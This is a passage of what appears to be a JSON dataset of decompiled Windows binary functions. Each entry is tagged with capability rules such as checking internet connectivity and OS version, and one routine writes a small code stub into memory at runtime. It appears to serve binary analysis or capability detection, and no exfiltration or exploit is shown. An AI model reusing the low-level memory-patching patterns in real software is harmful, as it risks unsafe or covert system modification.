var_ch = *(*(var_8h * 0x24 + -0x4e3a5694) + 0x1c + var_18h * 0x20);\n                        var_10h = *(*(var_8h * 0x24 + -0x4e3a5694) + 4 + var_18h * 0x20);\n                        var_14h = *(*(var_8h * 0x24 + -0x4e3a5694) + 0x14 + var_18h * 0x20);\n                        *(*(var_8h * 0x24 + -0x4e3a5694) + 8 + var_18h * 0x20) = 1;\n                        *(*(var_8h * 0x24 + -0x4e3a5694) + 0x14 + var_18h * 0x20) = 0;\n                        break;\n                    }\n                }\n                if (var_14h != 0) break;\n                fcn.00035330(*(var_8h * 0x24 + -0x4e3a5694));\n                *(var_8h * 0x24 + -0x4e3a569f) = 0;\n            }\n        }\n        if (0x31 < var_8h) {\n            *0xb1c5b054 = 0;\n            fcn.00035330(*0xb1c5b058);\n            var_4h = 0;\n        }\n        fcn.00037060(0xb1c5a93c, 1);\n        fcn.000345c0(0xb1c5a938);\n        if (var_4h == 0) {\n            return;\n        }\n        if (var_14h != 0) {\n            if (var_ch != 0) {\n                var_4h = fcn.0005ae70(var_10h, var_ch, 0, 0);\n            }\n            if (var_4h == 0) {\n                fcn.0005d930(var_10h, var_14h, 1);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 935
    },
    "0001a570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001a570(uint arg_8h, uint arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    if (arg_18h == 0) {\n        arg_1ch = 0;\n    }\n    if (arg_14h == 0) {\n        arg_14h = -0x4e418ab0;\n    }\n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    var_14h = (**0xb1bde0f8)(&var_8h, 0, &var_ch);\n    if (var_14h == 0) {\n        uVar3 = fcn.00035230(0x30);\n        iVar2 = uVar3;\n        if (iVar2 == 0) {\n            var_14h = -0x3fffffe9;\n        }\n        else {\n            (**0xb1bde0bc)(iVar2, var_ch, 0, arg_14h, 0, arg_18h, uVar3 >> 0x20 & 0xffffff00 | arg_10h & 0xff, arg_1ch);\n            cVar1 = (**0xb1bde0c8)(iVar2, arg_20h, 0, 0);\n            var_14h = (-(cVar1 != '\\0') & 0x3fffffff) + 0xc0000001;\n        }\n        if (var_ch != 0) {\n            (**0xb1bde2e4)();\n        }\n        if ((var_14h != 0) && (iVar2 != 0)) {\n            (**0xb1bde0b0)(iVar2, 0);\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 483
    },
    "0001a750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001a750(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.000785f2();\n    var_8h = 0;\n    do {\n        if (0xfff < var_8h) {\ncode_r0x0001a7be:\n            (**0xb1bde0e8)((-(var_8h < 0x1000) & 0x3fffff45) + 0xc00000bb);\n            return;\n        }\n        if (*(iVar1 + var_8h) == -0x4e4188b0) {\n            iVar2 = fcn.0001b770(0xb1c5b060, var_8h, 0);\n            iVar3 = fcn.00034c90();\n            if (iVar3 != 0x26) goto code_r0x0001a7be;\n            if (iVar2 != 0) {\n                fcn.00036f40(0xb1c5b064, var_8h);\n                goto code_r0x0001a7be;\n            }\n        }\n        var_8h = var_8h + 4;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "0001a7e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001a7e0(code **arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.000785f2();\n    var_10h = 0;\n    var_ch = 0;\n    pcVar1 = *arg_8h;\n    pcVar2 = arg_8h[1];\n    var_8h = 0;\n    var_14h = 0;\n    iVar4 = fcn.000785f8();\n    iVar4 = iVar4 + *(*0xb1c59660 + 0xc);\n    iVar5 = fcn.0001b770(0xb1c5b060, 0, 0);\n    if (iVar5 != 0) {\n        var_10h = *0xb1c5b060;\n        var_8h = *(iVar3 + *0xb1c5b060);\n        *(iVar3 + *0xb1c5b060) = iVar4;\n    }\n    iVar5 = fcn.0001b770(0xb1c5b064, 0, 0);\n    if (iVar5 != 0) {\n        var_ch = *0xb1c5b064;\n        var_14h = *(iVar3 + *0xb1c5b064);\n        *(iVar3 + *0xb1c5b064) = iVar4;\n    }\n    fcn.00035330(arg_8h);\n    uVar6 = (*pcVar1)(pcVar2);\n    if (var_8h != 0) {\n        *(iVar3 + var_10h) = var_8h;\n    }\n    if (var_14h != 0) {\n        *(iVar3 + var_ch) = var_14h;\n    }\n    (**0xb1bde0e8)(uVar6);\n    return;\n}\n",
        "token_count": 513
    },
    "0001a8e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001a8e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = 0xb1c5b060;\n    iVar1 = fcn.0001b770(0xb1c5b060, 0, 0);\n    if (iVar1 == 0) {\n        iVar1 = (**0xb1bde0dc)(&var_10h, 0x1f03ff, 0, 0, 0, 0xb1be7750, 0);\n        if (iVar1 == 0) {\n            fcn.000785ec(var_10h, 0, 0);\n            fcn.00078544();\n            uVar2 = var_10h;\n        }\n    }\n    var_ch = fcn.00035200(8);\n    if (var_ch == NULL) {\n        var_8h = -0x3fffff66;\n    }\n    else {\n        var_4h = arg_8h;\n        *var_ch = arg_ch;\n        var_ch[1] = arg_10h;\n        var_8h = (**0xb1bde0dc)(arg_8h, 0x1f03ff, 0, 0, 0, 0xb1be77e0, var_ch, uVar2);\n    }\n    if (var_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.000785b6(var_8h);\n        fcn.000354e0(uVar2);\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 419
    },
    "0001aa20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001aa20(uint arg_8h, int32_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_8h = 0;\n    uVar1 = (**0xb1bde004)();\n    *arg_10h = uVar1;\n    if (*arg_10h < arg_8h) {\n        uVar1 = (**0xb1bde014)();\n        *arg_10h = uVar1;\n    }\n    iVar2 = fcn.00057850();\n    if (iVar2 == 1) {\n        var_10h = 0;\n    }\n    else {\n        fcn.0001a4c0(0xb1c5b068, 0);\n        fcn.0001a4c0(0xb1c5b06c, 0);\n        iVar2 = fcn.00057850();\n        var_8h = fcn.00035230(iVar2 << 5);\n        if (var_8h == 0) {\n            var_10h = 0xc0000017;\n        }\n        else {\n            uVar3 = fcn.0001a4b0();\n            for (var_4h = 0; uVar4 = fcn.00057850(),  var_4h < uVar4; var_4h = var_4h + 1) {\n                if (var_4h != uVar3) {\n                    (**0xb1bde0d0)(var_4h * 0x20 + var_8h, 0xb1be79e0, 0);\n                    (**0xb1bde0a8)(var_4h * 0x20 + var_8h, 2);\n                    (**0xb1bde0ac)(var_4h * 0x20 + var_8h, extraout_ECX & 0xffffff00 | var_4h & 0xff);\n                    (**0xb1bde0f0)(var_4h * 0x20 + var_8h, 0, 0);\n                }\n            }\n            iVar2 = fcn.00057850();\n            iVar2 = iVar2 + -1;\n            do {\n                iVar5 = fcn.0001b770(0xb1c5b06c, iVar2, iVar2);\n            } while (iVar5 != iVar2);\n            var_10h = 0;\n        }\n    }\n    *arg_ch = var_8h;\n    return var_10h;\n}\n",
        "token_count": 645
    },
    "0001ab70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001ab70(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    fcn.000569a0(0xb1c5b068);\n    do {\n        iVar1 = fcn.0001b770(0xb1c5b06c, 0, 0);\n    } while (iVar1 != 0);\n    if (arg_8h != 0) {\n        fcn.00035330(arg_8h);\n    }\n    (**0xb1bde008)();\n    return 0;\n}\n",
        "token_count": 130
    },
    "0001abc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0001abc0(uint param_1, uint param_2, uint param_3, int32_t *param_4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t *var_14h;\n    uint var_18h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45830;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (var_14h == NULL) {\n        uVar1 = 0xc000000d;\n    }\n    else {\n        iVar2 = (**0xb1bde294)(var_8h, var_ch, 0, 0, 0);\n        if (iVar2 == 0) {\n            uVar1 = 0xc0000001;\n        }\n        else {\n            var_4h = 0;\n            (**0xb1bde2a0)(iVar2, 0, var_10h);\n            *var_14h = iVar2;\n            uVar1 = 0;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar1;\n}\n",
        "token_count": 346
    },
    "0001aca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0001aca0(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch;\n    uint var_18h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0xb1c45820;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    if ((var_8h == 0) || (var_ch == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        var_4h = 0;\n        (**0xb1bde29c)(var_ch);\n        (**0xb1bde2ac)(var_ch);\n        uVar1 = 0;\n    }\n    *in_FS_OFFSET = var_10h;\n    return uVar1;\n}\n",
        "token_count": 251
    },
    "0001ad50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001ad50(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        iVar1 = -0x3fffff11;\n    }\n    else {\n        uVar2 = fcn.0001abc0(*arg_8h, arg_ch, arg_14h, arg_18h);\n        iVar1 = uVar2;\n        if (iVar1 == 0) {\n            iVar1 = (**0xb1bde0e0)(*arg_18h, uVar2 >> 0x20 & 0xffffff00 | arg_10h & 0xff, 1, 0, 0, 0x10);\n            if (iVar1 == 0) {\n                fcn.0001aca0(*arg_8h, *arg_18h);\n                iVar1 = -0x3fffffff;\n            }\n            else {\n                *arg_8h = iVar1;\n                iVar1 = 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 283
    },
    "0001ade0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001ade0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h == 0) || (arg_ch == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        (**0xb1bde0a4)(arg_8h, arg_ch);\n        uVar1 = fcn.0001aca0(arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 118
    },
    "0001ae20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001ae20(int16_t *arg_8h, int16_t *arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t *arg_18h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint var_288h;\n    uint var_280h;\n    uint *var_27ch;\n    uint var_278h;\n    uint var_270h;\n    uint *var_26ch;\n    uint var_268h;\n    uint var_260h;\n    int16_t *var_25ch;\n    uint32_t var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint *var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    int32_t var_23ch;\n    uint32_t var_238h;\n    uint32_t var_234h;\n    uint var_22ch;\n    int32_t var_224h;\n    uint var_220h;\n    uint32_t var_21ch;\n    uint var_218h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_23ch = 0;\n    var_ch = 0;\n    var_8h = 0;\n    var_238h = 0;\n    var_234h = 0;\n    if (((arg_8h == NULL) || (*arg_8h == 0)) || (arg_ch == NULL)) {\n        return -0x3ffffff3;\n    }\n    fcn.000364b0(&var_218h, 0x104, arg_8h);\n    fcn.00078550(&var_22ch, &var_218h);\n    var_254h = 0x18;\n    var_250h = 0;\n    var_248h = 0x40;\n    var_24ch = &var_22ch;\n    var_244h = 0;\n    var_240h = 0;\n    var_224h = fcn.0001ec90(&var_ch, 0x80100000, &var_254h, &var_220h, 0, 0x80, 1, 1, 0x10, 0, 0);\n    if (var_224h != 0) {\n        return var_224h;\n    }\n    if (*arg_ch != 0) {\n        var_25ch = arg_ch;\n        do {\n            iVar1 = *var_25ch;\n            var_25ch = var_25ch + 1;\n        } while (iVar1 != 0);\n        if (arg_ch[(var_25ch - (arg_ch + 1) >> 1) + -1] != 0x5c) {\n            fcn.000364b0(&var_218h, 0x104, arg_ch);\n            goto code_r0x0001b0e5;\n        }\n    }\n    iVar2 = fcn.0007859e(arg_8h, 0x5c);\n    if (iVar2 == 0) {\n        var_4h = arg_8h;\n    }\n    else {\n        var_4h = iVar2 + 2;\n    }\n    if (*arg_ch == 0) {\n        fcn.000364b0(&var_218h, 0x104, var_4h);\n    }\n    else {\n        fcn.000364b0(&var_218h, 0x104, arg_ch);\n        var_26ch = &var_218h;\n        do {\n            iVar1 = *var_26ch;\n            var_26ch = var_26ch + 2;\n        } while (iVar1 != 0);\n        fcn.000785e6(&var_218h, 0xb1bde6b4, 0x104 - (var_26ch - (&var_218h + 2) >> 1));\n        var_27ch = &var_218h;\n        do {\n            iVar1 = *var_27ch;\n            var_27ch = var_27ch + 2;\n        } while (iVar1 != 0);\n        fcn.000785e6(&var_218h, var_4h, 0x104 - (var_27ch - (&var_218h + 2) >> 1));\n    }\ncode_r0x0001b0e5:\n    fcn.00078550(&var_22ch, &var_218h);\n    var_254h = 0x18;\n    var_250h = 0;\n    var_248h = 0x40;\n    var_24ch = &var_22ch;\n    var_244h = 0;\n    var_240h = 0;\n    var_224h = fcn.0001ec90(&var_8h, 0x40100000, &var_254h, &var_220h, 0, 0x80, 0, arg_18h != NULL, 0x10, 0, 0);\n    if (var_224h == 0) {\n        var_23ch = fcn.00035200(0x10000);\n        if (var_23ch == 0) {\n            var_224h = -0x3fffff66;\n        }\n        else {\n            if (arg_18h == NULL) {\n                var_238h = 0;\n                var_234h = 0;\n            }\n            else {\n                var_238h = *arg_18h;\n                var_234h = arg_18h[1];\n            }\n            var_21ch = 0;\n            while ((arg_10h == 0 || (iVar2 = (**0xb1bde0b4)(arg_10h),  iVar2 == 0))) {\n                bVar3 = CARRY4(var_21ch, var_238h);\n                var_238h = var_21ch + var_238h;\n                var_234h = var_234h + bVar3;\n                var_224h = fcn.000785e0(var_ch, 0, 0, 0, &var_220h, var_23ch, 0x10000, &var_238h, 0);\n                if (var_224h != 0) {\n                    if (var_224h == -0x3fffffef) {\n                        var_224h = 0;\n                    }\n                    goto code_r0x0001b340;\n                }\n                if ((arg_10h != 0) && (iVar2 = (**0xb1bde0b4)(arg_10h),  iVar2 != 0)) {\n                    var_224h = -0x3ffffee0;\n                    goto code_r0x0001b340;\n                }\n                var_224h = fcn.00078574(var_8h, 0, 0, 0, &var_220h, var_23ch, var_21ch, &var_238h, 0);\n                if (var_224h != 0) goto code_r0x0001b340;\n                if (arg_14h != 0) {\n                    for (var_258h = arg_14h / 200; var_258h != 0; var_258h = var_258h - 1) {\n                        if ((arg_10h != 0) && (iVar2 = (**0xb1bde0b4)(arg_10h),  iVar2 != 0)) {\n                            var_224h = -0x3ffffee0;\n                            goto code_r0x0001b340;\n                        }\n                        fcn.000209a0(200);\n                    }\n                }\n            }\n            var_224h = -0x3ffffee0;\n        }\n    }\ncode_r0x0001b340:\n    if (var_23ch != 0) {\n        fcn.00035330(var_23ch);\n    }\n    if (var_8h != 0) {\n        fcn.00078544(var_8h);\n    }\n    if (var_ch != 0) {\n        fcn.00078544(var_ch);\n    }\n    if ((var_224h == -0x3ffffee0) && (arg_18h != NULL)) {\n        *arg_18h = var_238h;\n        arg_18h[1] = var_234h;\n    }\n    return var_224h;\n}\n",
        "token_count": 1912
    },
    "0001b3b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0001b3b0(void)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t arg_8h_00;\n    uint var_288h;\n    uint var_284h;\n    int32_t var_280h;\n    uint var_27ch;\n    uchar *var_278h;\n    uint var_274h;\n    uchar *var_270h;\n    uint var_269h;\n    int32_t var_258h;\n    int32_t var_1cch;\n    int32_t var_1a0h;\n    int32_t var_9h;\n    uint var_4h;\n    \n    var_269h._0_1_ = 0;\n    var_9h._0_1_ = '\\0';\n    if (*0xb1c5b070 == NULL) {\n        uVar2 = (**0xb1bde004)();\n        if (uVar2 < 2) {\n            fcn.00060b70(&var_269h + 1);\n            fcn.00060c10(&var_269h + 1, 0x20);\n            fcn.00060c70(&var_269h + 1, 0);\n            *NULL = fcn.0005c850(*(*0xb1c59660 + 0xc), 0xb1bde6b8, &var_278h);\n            puVar1 = var_278h;\n            if (*NULL == 0) {\n                uVar8 = var_278h & 0xfff;\n                var_280h = -uVar8 + 0x1000;\n                *NULL = fcn.0001abc0(var_278h, var_280h, 0, &var_4h);\n                if (*NULL == 0) {\n                    var_269h._0_1_ = '\\x01';\n                    iVar7 = (puVar1 & 0xfffff000) + 0x1000;\n                    iVar3 = fcn.0001abc0(iVar7, 0x1000, 0, &var_274h);\n                    if (iVar3 == 0) {\n                        var_9h._0_1_ = '\\x01';\n                        var_280h = -uVar8 + 0x2000;\n                    }\n                    arg_8h = fcn.00035230(0x60);\n                    if (arg_8h != NULL) {\n                        var_270h = var_278h;\n                        fcn.000607b0(&var_269h + 1, var_278h, var_280h);\ncode_r0x0001b536:\n                        iVar3 = fcn.00060bb0(&var_269h + 1);\n                        if (iVar3 == 0) {\n                            stack0xfffffff4 = -0x3fffffff;\n                            fcn.00035330(arg_8h);\n                        }\n                        else {\n                            if (var_1cch != 0x1be) goto code_r0x0001b645;\n                            stack0xfffffff4 = 0;\n                            var_270h = (var_270h - var_278h) + arg_8h;\n                            *var_270h = 0xc6;\n                            var_270h[1] = 0x80;\n                            *(var_270h + 2) = var_280h;\n                            var_270h[6] = 0;\n                            var_270h[7] = 0xc3;\n                            puVar9 = arg_8h;\n                            puVar10 = arg_8h + 0xc;\n                            *0xb1c5b070 = arg_8h;\n                            for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar10 = *puVar9;\n                                puVar9 = puVar9 + 1;\n                                puVar10 = puVar10 + 1;\n                            }\n                            var_270h = var_270h + 0x36;\n                            *var_270h = 1;\n                            *0xb1c5b074 = arg_8h + 0xc;\n                        }\n                        goto code_r0x0001b6a5;\n                    }\n                    stack0xfffffff4 = -0x3fffff66;\ncode_r0x0001b6a5:\n                    if (var_269h != '\\0') {\n                        fcn.0001aca0(puVar1, var_4h);\n                    }\n                    if (var_9h != '\\0') {\n                        fcn.0001aca0(iVar7, var_274h);\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = -0x3fffffff;\n        }\n    }\n    else {\n        *NULL = 0;\n    }\n    return *NULL;\ncode_r0x0001b645:\n    uVar4 = fcn.00060ca0(&var_269h + 1);\n    iVar3 = &var_269h + 1;\n    uVar5 = fcn.00060c90(iVar3);\n    arg_8h_00 = &var_269h + 1;\n    iVar6 = fcn.00060c80(arg_8h_00);\n    fcn.0007877e(iVar6 + arg_8h, arg_8h_00, uVar5, iVar3, uVar4);\n    var_280h = var_1a0h;\n    iVar3 = fcn.00060ca0(&var_269h + 1);\n    var_270h = var_258h - iVar3;\n    goto code_r0x0001b536;\n}\n",
        "token_count": 1329
    },
    "0001b6f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0001b6f0(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    uVar1 = (**0xb1bde0c4)();\n    _auStack8 = uVar1 << 0x18;\n    if (arg_8h == uVar1) {\n        uVar3 = CONCAT31(arg_8h >> 7, uVar1);\n    }\n    else {\n        while (iVar2 = fcn.0001b770(0xb1c5b078, 1, 0),  iVar2 != 0) {\n            _auStack8 = 0;\n            fcn.000209a0(0);\n        }\n        if (arg_8h == 0) {\n            if (*0xb1c5b070 != NULL) {\n                (**0xb1c5b070)();\n            }\n        }\n        else if ((arg_8h == 1) && (*0xb1c5b074 != NULL)) {\n            (**0xb1c5b074)();\n        }\n        uVar3 = fcn.000674e0(0xb1c5b078);\n        uVar3 = uVar3 & 0xffffff00 | _auStack8 >> 0x18;\n    }\n    return uVar3;\n}\n",
        "token_count": 333
    },
    "0001b790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001b790(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.000344f0(0xb1c59ac4);\n    fcn.000344f0(0xb1c59994);\n    *0xb1c59abc = fcn.000352f0(100, 4);\n    if (*0xb1c59abc == 0) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        iVar1 = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde6cc, 0xb1be8c60, 0xb1c5b084);\n        if (iVar1 == 0) {\n            fcn.00063a90(*0xb1c5b084);\n            iVar1 = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde6d8, 0xb1be8ec0, 0xb1c5b088);\n            if (iVar1 == 0) {\n                fcn.00063a90(*0xb1c5b088);\n                iVar1 = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde6e8, 0xb1be90a0, 0xb1c5b08c);\n                if (iVar1 == 0) {\n                    fcn.00063a90(*0xb1c5b08c);\n                    iVar1 = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde6f4, 0xb1be9190, 0xb1c5b090);\n                    if (iVar1 == 0) {\n                        fcn.00063a90(*0xb1c5b090);\n                        fcn.00036f40(0xb1c5b094, 1);\n                    }\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 475
    },
    "0001b8c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001b8c0(void)\n\n{\n    int32_t iVar1;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    fcn.00063a90(*0xb1c5b090);\n    fcn.000635f0(0xb1c5b090);\n    fcn.00063a90(*0xb1c5b08c);\n    fcn.000635f0(0xb1c5b08c);\n    fcn.00063a90(*0xb1c5b088);\n    fcn.000635f0(0xb1c5b088);\n    fcn.00063a90(*0xb1c5b084);\n    fcn.000635f0(0xb1c5b084);\n    iVar1 = fcn.0001b770(0xb1c5b094, 0, 1);\n    if (iVar1 != 0) {\n        while (iVar1 = fcn.0001b770(0xb1c5b098, 0, 0),  iVar1 != 0) {\n            fcn.000209a0(1);\n        }\n        fcn.00034550(0xb1c59ac4);\n        for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n            if (*(*0xb1c59abc + var_4h * 4) != 0) {\n                iVar1 = *(*0xb1c59abc + var_4h * 4);\n                for (var_ch = 0; var_ch < 100; var_ch = var_ch + 1) {\n                    fcn.00035330(*(iVar1 + 0x14 + var_ch * 0x20));\n                }\n                fcn.00035330(iVar1);\n            }\n        }\n        fcn.00035330(*0xb1c59abc);\n        fcn.000345c0(0xb1c59ac4);\n        fcn.00034520(0xb1c59ac4);\n        fcn.00034550(0xb1c59994);\n        fcn.00078790(0xb1c59998, 0, 0x80);\n        fcn.000345c0(0xb1c59994);\n        fcn.00034520(0xb1c59994);\n    }\n    return;\n}\n",
        "token_count": 550
    },
    "0001ba30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
